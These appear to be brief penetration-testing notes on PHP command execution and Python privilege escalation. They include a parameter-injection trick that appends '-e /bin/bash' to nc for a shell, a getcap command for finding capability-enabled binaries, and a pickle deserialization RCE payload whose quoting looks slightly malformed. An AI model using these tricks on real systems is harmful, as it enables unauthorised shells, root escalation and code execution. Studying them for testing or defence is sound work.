# php
```php
escapeshellcmd
```
- prevents command injection
- doesn't prevent parameter injection -> see what command gets executed, can you make it useful?
- E.g. if `nc` is executed in the back-end, you can append `-e /bin/bash` to have a shell
## exec
Directly executes on the machine
# Python
## Capabilities
```python
os.setuid(0)
```
Standard users cannot switch to root simply by asking code to do so. This will fail with a PermissionError unless the **Python binary itself** has specific permissions. -> check capabilities: `getcap -r / 2>/dev/null`
## Pickle
```python
cPickle.loads() / pickle.loads()` -> RCE:`cos\nsystem\n(S'[COMMAND]'\ntR.'\ntR."
```
